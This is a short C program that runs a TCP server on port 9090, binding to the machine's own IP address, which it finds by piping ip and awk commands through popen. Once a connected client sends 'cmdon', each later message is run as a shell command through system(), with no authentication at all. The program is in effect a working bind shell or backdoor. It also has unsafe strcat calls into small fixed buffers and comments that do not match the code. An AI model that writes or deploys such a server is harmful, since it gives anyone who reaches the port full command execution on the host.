#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>

#define PORT 9090
#define BFSZ 1024

int main(void) {
  int server_fd, bind_result, new_socket, valread;
  struct sockaddr_in address;
  int opt = 1;
  char HOST[20] = "";

  // creating socket file descriptor
  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  // AF_INIT     : IPv4 protocol                        --> communication domain
  // AF_INET6    : IPv6 protocol                        --> communication domain
  // SOCK_STREAM : TCP(reliable, connection oriented)   --> communication type
  // SOCK_DGRAM  : UDP(unreliable, connectionless)      --> communication type
  // 0 is protocol value for Internet Protocol(IP)      --> protocol

  // Forcefully attaching socket to the port 8080
  //Address already in use 'a karşı
  if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))){
    perror("setsockopt");
    exit(EXIT_FAILURE);
  }


  if (server_fd == 0){
    perror("Socket Failed");
    exit(EXIT_FAILURE);
  }

  FILE *cmd = popen("ip -o -4 route show to default | awk '{print $5}'", "r");
  char nic[10] = {0};
  fgets(nic, sizeof(nic), cmd);
  strtok(nic, "\n");

  char get_ip_cmd[50] = {0};
  strcat(get_ip_cmd, "/sbin/ip -o -4 addr list ");
  strcat(get_ip_cmd, (char*)&nic);
  strcat(get_ip_cmd, "| awk '{print $4}' | cut -d/ -f1");

  FILE *cmd2 = popen(get_ip_cmd, "r");
  char ip4[20] = {0};
  fgets(ip4, sizeof(ip4), cmd2);
  strtok(ip4, "\n");


  strcat(HOST, (char*)&ip4);
  // TODO --> take ip address

  address.sin_family      = AF_INET;
//address.sin_addr.s_addr = id->ifa_addr;
  address.sin_addr.s_addr = inet_addr(HOST);
  address.sin_port        = htons(PORT);

  // forcefully attaching socket to the port 9090
  bind_result = bind(server_fd, (struct sockaddr *)&address, sizeof(address));
  if (bind_result < 0){
    perror("Bind Failed");
    exit(EXIT_FAILURE);
  }
  printf("Connected to %s:%d\n", HOST, PORT);

  // listening
  if (listen(server_fd, 3) < 0){
    perror("Listen Failed");
    exit(EXIT_FAILURE);
  }
  printf("Listening...\n");

  struct sockaddr_in client_info;
  socklen_t len = sizeof(client_info);
  new_socket = accept(server_fd, (struct sockaddr *)&client_info, &len);
  if(new_socket < 0){
    perror("Client Failed");
    exit(EXIT_FAILURE);
  }

  int cmdon = 0;

  char buffer[BFSZ];
  while(1){
    printf("%d\n",client_info.sin_addr.s_addr);
    memset(buffer, 0, BFSZ);
    valread = recv(new_socket, buffer, BFSZ, 0);
    if (valread < 0){
      perror("Receive Failed");
      exit(EXIT_FAILURE);
    }

    if (strcmp(buffer, "cmdon") == 0){ // if the message is "cmdon"
       cmdon = 1;
       //continue;
    }
    else if (strcmp(buffer, "cmdoff") == 0){
      cmdon = 0;
      //continue;
    }

    if(cmdon == 1){
      system(buffer);
    }
    else printf("%s\n", buffer);
  }
  close(new_socket);
  close(server_fd);

  return 0;
}
